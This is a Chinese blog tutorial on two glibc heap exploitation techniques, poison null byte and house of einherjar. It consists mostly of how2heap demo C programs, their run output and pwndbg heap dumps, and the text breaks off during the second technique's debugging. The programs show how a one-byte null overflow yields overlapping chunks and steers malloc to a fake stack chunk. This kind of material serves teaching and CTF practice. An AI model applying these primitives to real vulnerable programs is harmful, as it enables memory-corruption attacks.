
# how2heap之poison_null_bytes&amp;&amp;house of einherjar


                                阅读量   
                                **789987**
                            
                        |
                        
                                                                                                                                    ![](./img/197667/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/197667/t01e0c10f1efb991b6e.jpg)](./img/197667/t01e0c10f1efb991b6e.jpg)

> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
本文包括poison null bytes和house of einherjar

PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂



## 参考网站

```
https://ctf-wiki.github.io/ctf-wiki
https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606
```



## poison null bytes

### <a class="reference-link" name="%E5%BA%8F"></a>序

作者的话:本例推荐在ubuntu14.04上进行测试,并且只适用于没有tcache的glibc

这个poison null byte利用思路依旧是制造一个overlapping chunk,虽然作者说要在ubuntu14.04上测试,但其实ubuntu16.04也是可以的,只要没有tcache,这种攻击方式就是可以使用的:)

### <a class="reference-link" name="%E6%BA%90%E4%BB%A3%E7%A0%81"></a>源代码

这里我也删了一部分作者的话,加了些注释

```
#include &lt;stdio.h&gt;                                                                                                                              
#include &lt;stdlib.h&gt;                                                                                                                                      
#include &lt;string.h&gt;                                                                                                                                      
#include &lt;stdint.h&gt;                                                                                                                                      
#include &lt;malloc.h&gt;                                                                                                                                      


int main()                                                                                                                                               
{                                                                                                                                                                                  
        uint8_t* a;                                                                                                                                      
        uint8_t* b;                                                                                                                                      
        uint8_t* c;                                                                                                                                      
        uint8_t* b1;                                                                                                                                     
        uint8_t* b2;                                                                                                                                     
        uint8_t* d;                                                                                                                                      
        void *barrier;                                                                                                                                   

        fprintf(stderr, "We allocate 0x100 bytes for 'a'.n");                                                                                           
        a = (uint8_t*) malloc(0x100);                                                                                                                    
        fprintf(stderr, "a: %pn", a);                                                                                                                   
        int real_a_size = malloc_usable_size(a);             
        //我们想溢出'a'的话,我们需要知道'a'的真实大小
        fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "                                                         
                "(it may be more than 0x100 because of rounding): %#xn", real_a_size);                                                                  

        //chunk size属性的最小的有效字节不能是0x00,最小的也必须是0x10,因为chunk的size包括请求的量加上元数据所需的大小(也就是我们的size和pre_size然后空间复用
        /* chunk size attribute cannot have a least significant byte with a value of 0x00.                                                               
         * the least significant byte of this will be 0x10, because the size of the chunk includes                                                       
         * the amount requested plus some amount required for the metadata. */                                                                           
        b = (uint8_t*) malloc(0x200);                                                                                                                    

        fprintf(stderr, "b: %pn", b);                                                                                                                   

        c = (uint8_t*) malloc(0x100);                                                                                                                    
        fprintf(stderr, "c: %pn", c);                                                                                                                   

        barrier =  malloc(0x100);              

        //c我们分配了barrier,这样我们free c的时候就不会被合并到top chunk里了,这个burrier并不是必须的,只不过是为了减少可能产生的问题                                                                                                     
        fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.n"                                    
                "The barrier is not strictly necessary, but makes things less confusingn", barrier);                                                    

        uint64_t* b_size_ptr = (uint64_t*)(b - 8);                                                                                                       

        //在新版本的glibc中添加了新的check即: size==prev_next(next_chunk)
        // added fix for size==prev_size(next_chunk) check in newer versions of glibc                                                                    
        // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30        
        //这个被新增的check要求我们允许b中有null指针而不仅仅是c                                       
        // this added check requires we are allowed to have null pointers in b (not just a c string)                                                     
        //*(size_t*)(b+0x1f0) = 0x200;   
        //在新版本的glibc中我们需要让我们更新的size包含b自身去pass 'chunksize(P)!=prev_size(next_chunk(P))'                                                                                                                
        fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "                                      
                "the check 'chunksize(P) != prev_size (next_chunk(P))'n");           

        //我们将此位置设为0x200,因为0x200==(0x211&amp;0xff00)
        // we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)   
        //这个是b.size的值在被null字节覆盖之后的值                                                                              
        // which is the value of b.size after its first byte has been overwritten with a NULL byte                                                       
        *(size_t*)(b+0x1f0) = 0x200;                                                                                                                     

        //这个技术通过覆盖一个free chunk的元数据来生效
        // this technique works by overwriting the size metadata of a free chunk                                                                         
        free(b);                                                                                                                                         

        fprintf(stderr, "b.size: %#lxn", *b_size_ptr);                                                                                                  
        fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_usen"); 
        //我们通过用一个null字节来溢出a来修改b的元数据                                                                                   
        fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'n");                                                           
        a[real_a_size] = 0; // &lt;--- THIS IS THE "EXPLOITED BUG"                                                                                          
        fprintf(stderr, "b.size: %#lxn", *b_size_ptr);                                                                                                  

        uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;                                                                                                    
        fprintf(stderr, "c.prev_size is %#lxn",*c_prev_size_ptr);                                                                                       

        //这个malloc将会在b上调用unlink
        // This malloc will result in a call to unlink on the chunk where b was.   
        //新增的chunk,如果没有像之前那样被正确处理,就会检测堆是否被损坏了                                                                     
        // The added check (commit id: 17f487b), if not properly handled as we did before,                                                               
        // will detect the heap corruption now.                                                                                                          
        // The check is this: chunksize(P) != prev_size (next_chunk(P)) where                                                                            
        // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)                                                           
                // next_chunk(P) == b-0x10+0x200 == b+0x1f0
        // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
        fprintf(stderr, "We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))n",
                *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
        b1 = malloc(0x100);

        fprintf(stderr, "b1: %pn",b1);
        //现在我们malloc b1,他将会被放在b的地方,此时,c的prev_size将会被更新
        fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
                "At this point c.prev_size should have been updated, but it was not: %#lxn",*c_prev_size_ptr);
        fprintf(stderr, "Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
                "before c.prev_size: %lxn",*(((uint64_t*)c)-4));
        //我们malloc b2作为我们的攻击目标
        fprintf(stderr, "We malloc 'b2', our 'victim' chunk.n");
        // Typically b2 (the victim) will be a structure with valuable pointers that we want to control

        b2 = malloc(0x80);
        fprintf(stderr, "b2: %pn",b2);

        memset(b2,'B',0x80);
        fprintf(stderr, "Current b2 content:n%sn",b2);

        //现在我们释放b1和c,这将会合并b1和c(无视b2)
        fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').n");

        free(b1);
        free(c);

        //现在我们malloc d来和b2重叠
        fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.n");
        d = malloc(0x300);
        fprintf(stderr, "d: %pn",d);

        fprintf(stderr, "Now 'd' and 'b2' overlap.n");
        memset(d,'D',0x300);

        fprintf(stderr, "New b2 content:n%sn",b2);

        fprintf(stderr, "Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
                "for the clear explanation of this technique.n");
}
```

### <a class="reference-link" name="%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"></a>运行结果

```
Welcome to poison null byte 2.0!
Tested in Ubuntu 14.04 64bit.
This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
We allocate 0x100 bytes for 'a'.
a: 0x241a010
Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108
b: 0x241a120
c: 0x241a330
We allocate a barrier at 0x241a440, so that c is not consolidated with the top-chunk when freed.
The barrier is not strictly necessary, but makes things less confusing
In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'
b.size: 0x211
b.size is: (0x200 + 0x10) | prev_in_use
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x200
c.prev_size is 0x210
We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
b1: 0x241a120
Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 0x210
Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0
We malloc 'b2', our 'victim' chunk.
b2: 0x241a230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2'.
d: 0x241a120
Now 'd' and 'b2' overlap.
New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.
```

### <a class="reference-link" name="%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95"></a>关键代码调试

本例9个断点分别断在:

```
40   barrier =  malloc(0x100);
 ► 41   fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.n"
   42           "The barrier is not strictly necessary, but makes things less confusingn", barrier);

   56   // this technique works by overwriting the size metadata of a free chunk
 ► 57   free(b);

   58
 ► 59   fprintf(stderr, "b.size: %#lxn", *b_size_ptr);

   62   a[real_a_size] = 0; // &lt;--- THIS IS THE "EXPLOITED BUG"
 ► 63   fprintf(stderr, "b.size: %#lxn", *b_size_ptr);

   77   b1 = malloc(0x100);
   78
 ► 79   fprintf(stderr, "b1: %pn",b1);

   87   b2 = malloc(0x80);
 ► 88   fprintf(stderr, "b2: %pn",b2);

   95  free(b1);
   96  free(c);
   97
 ► 98  fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.n");

   99  d = malloc(0x300);
 ► 100  fprintf(stderr, "d: %pn",d);

   103  memset(d,'D',0x300);
   104
 ► 105  fprintf(stderr, "New b2 content:n%sn",b2);
```

下面我们开始调试

首先是分配了chunk a,b,c,barrier

```
pwndbg&gt; heap
0x603000 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0,
  size = 529,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603320 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603430 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603540 PREV_INUSE {
  prev_size = 0,
  size = 133825,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

然后程序修改了b+0x1f0位为0x200,也就是

```
pwndbg&gt; p/x 0x603120+0x1f0
$4 = 0x603310
pwndbg&gt; x/10gx 0x603310
0x603310:       0x0000000000000200      0x0000000000000000
0x603320:       0x0000000000000000      0x0000000000000111
0x603330:       0x0000000000000000      0x0000000000000000
0x603340:       0x0000000000000000      0x0000000000000000
0x603350:       0x0000000000000000      0x0000000000000000
```

好了,下面我们继续,此时程序已经释放了b

```
pwndbg&gt; heap
0x603000 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0,
  size = 529,
  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603320 {
  prev_size = 528,
  size = 272,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603430 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603540 PREV_INUSE {
  prev_size = 0,
  size = 133825,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
pwndbg&gt; bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x603110 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603110
smallbins
empty
largebins
empty
```

之后,程序将a[real_a_size]修改为了0x00,也就是将我们的b的size改为了0x200,(为了通过前文所说的check)此时的堆

```
pwndbg&gt; heap
0x603000 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603110 {
  prev_size = 0,
  size = 512,
  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603310 {
  prev_size = 512,
  size = 0,
  fd = 0x210,
  bk = 0x110,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
pwndbg&gt; bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x603110 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603110
smallbins
empty
largebins
empty
```

可以看到,随着b的size被覆盖为了0x200,c的pre_size也变成了0x200

之后我们再次调用malloc的时候,因为b被视为为free态,此时会调用unlink

```
pwndbg&gt; heap
0x603000 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x7ffff7dd1d68 &lt;main_arena+584&gt;,
  bk = 0x7ffff7dd1d68 &lt;main_arena+584&gt;,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603220 PREV_INUSE {
  prev_size = 0,
  size = 241,
  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603310 {
  prev_size = 240,
  size = 0,
  fd = 0x210,
  bk = 0x110,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
pwndbg&gt; bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x603220 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603220 /* ' 2`' */
smallbins
empty
largebins
empty
```

此时我们的b1已经被放到了原本b的位置

```
pwndbg&gt; p b1-0x10
$15 = (uint8_t *) 0x603110 ""
pwndbg&gt; p b-0x10
$17 = (uint8_t *) 0x603110 ""
pwndbg&gt;
```

然后系统又malloc了b2

```
pwndbg&gt; heap
0x603000 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x7ffff7dd1d68 &lt;main_arena+584&gt;,
  bk = 0x7ffff7dd1d68 &lt;main_arena+584&gt;,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603220 PREV_INUSE {
  prev_size = 0,
  size = 145,
  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x6032b0 FASTBIN {
  prev_size = 0,
  size = 97,
  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603310 {
  prev_size = 96,
  size = 0,
  fd = 0x210,
  bk = 0x110,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

```
pwndbg&gt; p b2-0x10
$19 = (uint8_t *) 0x603220 ""
```

可以看到我们的b2也在原本b所在的位置上

随后我们释放b1和c,程序会直接无视b2合并b1和c,因为c的pre_size为

```
pwndbg&gt; heap
0x603000 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0,
  size = 801,
  fd = 0x6032b0,
  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603430 {
  prev_size = 800,
  size = 272,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603540 PREV_INUSE {
  prev_size = 0,
  size = 133825,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x603110 —▸ 0x6032b0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603110
smallbins
empty
largebins
empty
pwndbg&gt; x/10gx 0x603110
0x603110:       0x0000000000000000      0x0000000000000321
0x603120:       0x00000000006032b0      0x00007ffff7dd1b78
0x603130:       0x0000000000000000      0x0000000000000000
0x603140:       0x0000000000000000      0x0000000000000000
0x603150:       0x0000000000000000      0x0000000000000000
pwndbg&gt;
```

可以看到程序将b1和c合并了,大小为0x321,此时我们申请d,就会导致d和b2的overlapping

```
pwndbg&gt; heap
0x603000 PREV_INUSE {
  prev_size = 0,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0,
  size = 801,
  fd = 0x7ffff7dd1e88 &lt;main_arena+872&gt;,
  bk = 0x7ffff7dd1e88 &lt;main_arena+872&gt;,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603430 PREV_INUSE {
  prev_size = 800,
  size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603540 PREV_INUSE {
  prev_size = 0,
  size = 133825,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
pwndbg&gt; p d-0x10
$36 = (uint8_t *) 0x603110 ""
pwndbg&gt; p b2-0x10
$37 = (uint8_t *) 0x603220 "2001"
```

此时b2的值为

```
pwndbg&gt; x/10gx b2-0x10
0x603220:       0x0000000000000110      0x0000000000000090
0x603230:       0x4242424242424242      0x4242424242424242
0x603240:       0x4242424242424242      0x4242424242424242
0x603250:       0x4242424242424242      0x4242424242424242
0x603260:       0x4242424242424242      0x4242424242424242
```

然后我们给d赋值,之后b2的值变成了

```
pwndbg&gt; x/10gx b2-0x10
0x603220:       0x4444444444444444      0x4444444444444444
0x603230:       0x4444444444444444      0x4444444444444444
0x603240:       0x4444444444444444      0x4444444444444444
0x603250:       0x4444444444444444      0x4444444444444444
0x603260:       0x4444444444444444      0x4444444444444444
```

可以看到我们的b2已经被修改了

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

程序首先malloc了a(0x100),b(0x200),c(0x100),barrier(0x100)四个chunk

随后为了绕过check,程序将b+0x1f0的位置设为了0x200

紧接着程序Free掉了b并将b的size设为了0x200(原本是0x211)

随后程序malloc了b1(0x100),因为b是被Free掉的,因此b1就会被被放到b的部分,而b做了一个unlink,一分两半

随后程序又malloc了b2(0x80),b2依旧是所属b的

之后程序为了方便看效果,将b2填满了’B’

最后程序free掉了b1和c,因为c的pre_size为0x210,因此程序就会将b1和c合并,因为b2位于b1和c之间,虽然b2其实并未被free,但是我们已经可以申请到b2的内存了

此时程序malloc了d(0x300),系统就会把b1和c合并后的大chunk给用户,此时d就申请到了原本b开始到b+0x310结束的内存,将b2包了起来

构成了overlapping,此时给d赋值为”D”,可以看到b2也被覆盖成了”D” 🙂



## house of einherjar

### <a class="reference-link" name="%E5%BA%8F"></a>序

这个利用技术由Hiroki Matsukuma提出,具体内容可以看[链接](https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606)

这个技术也就是利用free的后向合并把top chunk设为我们伪造的chunk地址来强制malloc分配到我们伪造的地址

### <a class="reference-link" name="%E6%BA%90%E4%BB%A3%E7%A0%81"></a>源代码

同样的,我这里删了一点作者的话并加了注释

作者的话:

感谢st4g3r公布这个技术

这个攻击技巧使用了off-by-one溢出漏洞，用一个 null字节来通过malloc控制指针

并且这个技术比poision null byte更强，但是也有一个附加条件就是需要泄漏堆

在ubuntu16.04 64bits上测试，可以在你有一个off-by-null漏洞时使用

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;


int main()
{
        uint8_t* a;
        uint8_t* b;
        uint8_t* d;

        fprintf(stderr, "nWe allocate 0x38 bytes for 'a'n");
        a = (uint8_t*) malloc(0x38);
        fprintf(stderr, "a: %pn", a);

    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, "Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#xn", real_a_size);

    // create a fake chunk
    //我们可以在任意一个我们想要的地方来创建一个fake chunk,本例中我们将在栈上创建这个fake chunk
    fprintf(stderr, "nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stackn");
    //当然，你可以在heap或者bss段任一个你知道地址的地方创建fake chunk
    fprintf(stderr, "However, you can also create the chunk in the heap or the bss, as long as you know its addressn");
    //我们将我们的fwd和bck指针指向fake_chunk来pass unlink的checks
    fprintf(stderr, "We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checksn");
    //尽管有的时候我们可以在这儿使用unsafe unlink技术
    fprintf(stderr, "(although we could do the unsafe unlink technique here in some scenarios)n");

    size_t fake_chunk[6];

    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P-&gt;bk-&gt;size == P-&gt;prev_size
    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
    fake_chunk[2] = (size_t) fake_chunk; // fwd
    fake_chunk[3] = (size_t) fake_chunk; // bck
    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize


    fprintf(stderr, "Our fake chunk at %p looks like:n", fake_chunk);
    fprintf(stderr, "prev_size (not used): %#lxn", fake_chunk[0]);
    fprintf(stderr, "size: %#lxn", fake_chunk[1]);
    fprintf(stderr, "fwd: %#lxn", fake_chunk[2]);
    fprintf(stderr, "bck: %#lxn", fake_chunk[3]);
    fprintf(stderr, "fwd_nextsize: %#lxn", fake_chunk[4]);
    fprintf(stderr, "bck_nextsize: %#lxn", fake_chunk[5]);



        /* In this case it is easier if the chunk size attribute has a least significant byte with
         * a value of 0x00. The least significant byte of this will be 0x00, because the size of
         * the chunk includes the amount requested plus some amount required for the metadata. */
        b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);

        fprintf(stderr, "nWe allocate 0xf8 bytes for 'b'.n");
        fprintf(stderr, "b: %pn", b);

        uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    //这个技术通过覆盖chunk的size以及pre_inuse位来工作
    /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

        fprintf(stderr, "nb.size: %#lxn", *b_size_ptr);
        fprintf(stderr, "b.size is: (0x100) | prev_inuse = 0x101n");
        fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'n");
        a[real_a_size] = 0;
        fprintf(stderr, "b.size: %#lxn", *b_size_ptr);
    //如果b的size是0x100的倍数，那么就很简单了，连size都不用改，直接修改他的pre_inuse位就好啦
    fprintf(stderr, "This is easiest if b.size is a multiple of 0x100 so you "
           "don't change the size of b, only its prev_inuse bitn");
    //如果已经被修改了，我们将在b内需要一个fake chunk，它将尝试合并下一个块
    fprintf(stderr, "If it had been modified, we would need a fake chunk inside "
           "b where it will try to consolidate the next chunkn");

    // Write a fake prev_size to the end of a
    fprintf(stderr, "nWe write a fake prev_size to the last %lu bytes of a so that "
           "it will consolidate with our fake chunkn", sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    fprintf(stderr, "Our fake prev_size will be %p - %p = %#lxn", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;

    //修改fake chunk的size去反应b的新的prev_size
    //Change the fake chunk's size to reflect b's new prev_size
    fprintf(stderr, "nModify fake chunk's size to reflect b's new prev_sizen");
    fake_chunk[1] = fake_size;

    //free b，之后他就会和我们的fake chunk合并了
    // free b and it will consolidate with our fake chunk
    fprintf(stderr, "Now we free b and this will consolidate with our fake chunk since b prev_inuse is not setn");
    free(b);
    fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)n", fake_chunk[1]);

    //如果我们在free b之前分配另一个chunk,我们需要做两件事
    //if we allocate another chunk before we free b we will need to
    //do two things:

    //1)我们将需要调整我们的fake chunk的size来使得fake_chunk+fake_chunk的size指针在我们所能控制的区域内
    //1) We will need to adjust the size of our fake chunk so that
    //fake_chunk + fake_chunk's size points to an area we control

    //2)我们将需要在我们控制的地址写我们的fake chunk的size
    //2) we will need to write the size of our fake chunk
    //at the location we control.

    //在做了这两件事情之后，当unlink被调用的时候，我们的Fake chunk就将通过check
    //After doing these two things, when unlink gets called, our fake chunk will
    //pass the size(P) == prev_size(next_chunk(P)) test.

    //否则我们需要确定我们的fake chunk可以抵御荒野？？？(荒野这里有点迷离
    //otherwise we need to make sure that our fake chunk is up against the
    //wilderness

    //现在我们再调用malloc的时候，返回的时候就该是我们fake chunk的地址了
    fprintf(stderr, "nNow we can call malloc() and it will begin in our fake chunkn");
    d = malloc(0x200);
    fprintf(stderr, "Next malloc(0x200) is at %pn", d);
}
```

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"></a>程序运行结果

```
Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.

We allocate 0x38 bytes for 'a'
a: 0x1767010
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38

We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7ffc0cadecb0 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7ffc0cadecb0
bck: 0x7ffc0cadecb0
fwd_nextsize: 0x7ffc0cadecb0
bck_nextsize: 0x7ffc0cadecb0

We allocate 0xf8 bytes for 'b'.
b: 0x1767050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x1767040 - 0x7ffc0cadecb0 = 0xffff8003f4c88390

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffff8003f4ca9351 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7ffc0cadecc0
```

### <a class="reference-link" name="%E5%85%B3%E9%94%AE%E9%83%A8%E5%88%86%E8%B0%83%E8%AF%95"></a>关键部分调试

断点如下

```
24   a = (uint8_t*) malloc(0x38);
 ► 25   fprintf(stderr, "a: %pn", a);
   26

   41     fake_chunk[3] = (size_t) fake_chunk; // bck
   42     fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
   43     fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
 ► 44
   45

   57   b = (uint8_t*) malloc(0xf8);
 ► 58     int real_b_size = malloc_usable_size(b);

   69   a[real_a_size] = 0;
 ► 70   fprintf(stderr, "b.size: %#lxn", *b_size_ptr);

